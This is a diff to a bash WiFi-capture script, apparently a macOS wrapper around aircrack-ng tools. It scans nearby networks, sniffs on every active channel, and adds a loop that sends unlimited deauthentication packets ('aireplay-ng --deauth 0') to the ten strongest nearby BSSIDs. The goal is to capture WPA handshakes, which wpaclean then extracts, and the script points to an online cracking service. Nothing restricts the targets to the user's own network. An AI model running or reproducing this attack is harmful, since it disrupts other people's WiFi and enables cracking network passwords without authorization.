@@ -169,13 +169,16 @@ function _runMac() {
   mkdir -p $CAPTURE_FOLDER
   cd $CAPTURE_FOLDER
 
-  sudo "${AIRPORT_CMD}" -zs
+  #sudo "${AIRPORT_CMD}" -zs
+  # TODO: Move to variable
+  wifis=$(sudo ${AIRPORT_CMD} -zs | tee /dev/tty)
   echo -e ""
+  #echo $wifis
 
   iface="en0"
 
   # Start sniffing on channel (puts wifi in monitor mode).
-  # This will run until interrupted with Ctrl+C
+    # This will run until interrupted with Ctrl+C
   # The parentheses make it execute in a subshell, so the "exit" just exits that.
   (
     # Run following after Ctrl+C interrupt.
@@ -190,17 +193,31 @@ function _runMac() {
       exit
     }
     # Get list of channels with wifis.
+    #echo "WIFIS IN:\n$wifis"
+    channels=$(printf '%s' "$wifis" | awk -F ' ' '{print $4}' | sort | uniq)
+    #echo "CHANNELS IN:\n$channels"
+    # For each channel start sniffing.
+    echo -e "[${BLUE}START${RESET}] Starting sniffing on all channels with active wifis."
+    for i in $channels; do
+      if [[ $i =~ ^[0-9]+$ ]]; then
+          printf "%s[CH: %03d]%s Sniffing on channel %s: " ${GRAY} $i ${RESET} $i
+          sudo "${AIRPORT_CMD}" $iface sniff $i &
+          sleep 1
+      fi
+    done
+
+    # Get list of last 10 bssids (the ones with the highest signal)
+    echo -e "[${BLUE}START${RESET}] Run deauth on the BSSIDs with the highest signal"
+    bssids=$(printf '%s' "$wifis" | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}' | tail -10)
+    #bssids=$(printf '%s' "$wifis" | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}' | sort | uniq)
+    #echo "BSSIDS IN:\n$bssids"
+    # While sniffing still happening try doing deauth.
     while true; do
-      channels=$(${AIRPORT_CMD} -s | awk -F ' ' '{print $3}' | sort | uniq)
-      for i in $channels; do
-        if [[ $i =~ ^[0-9]+$ ]]; then
-            printf "%s[CH: %03d]%s Sniffing on channel %s: " ${GRAY} $i ${RESET} $i
-            sudo "${AIRPORT_CMD}" $iface sniff $i &
-            sleep 1
-        fi
+      for bssid in $bssids; do
+        printf "%s[BSSID: %s]%s Running deauth: " ${GRAY} $bssid ${RESET}
+        sudo aireplay-ng --deauth 0 -a $bssid $iface
+        sleep 1
       done
-      # airport can't get channels when in monitor mode ($channels will be empty),
-      # so after the first one, this will just keep looping and waiting for end.
       sleep 1
     done
   )
@@ -214,13 +231,14 @@ function _runMac() {
   # Run WPAClean to combine all the result into single nice capture. wpaclean is part of aircrack-ng.
   echo -e "[${BLUE}START${RESET}] Extract useful stuff from the caps into $CAPTURE_FOLDER/wpa.cap"
   wpaclean "$CAPTURE_FOLDER/wpa.cap" /tmp/airportSniff*.cap | tee >(grep "Net" >> $CAPTURE_FOLDER/besside.log)
+  # TODO: if it succeeds, then following should run, wpa.cap may not always be there.
   if [[ -e "$CAPTURE_FOLDER/wpa.cap" ]]; then
     echo -e "[${GREEN}DONE${RESET}] Filtered output is in $CAPTURE_FOLDER/wpa.cap"
     sudo rm /tmp/airportSniff*
     echo -e "[${GREEN}DONE${RESET}] Removed all /tmp/airportSniff*"
     echo -e "Don't upload the results to https://wpa-sec.stanev.org for automated cracking."
   else
-    echo -e "[${RED}ERROR${RESET}] wpaclean returned error"
+    echo -e "[${RED}ERROR${RESET}] No WPA handshakes were captured or wpaclean returned error"
     exit 1
   fi
   exit 0
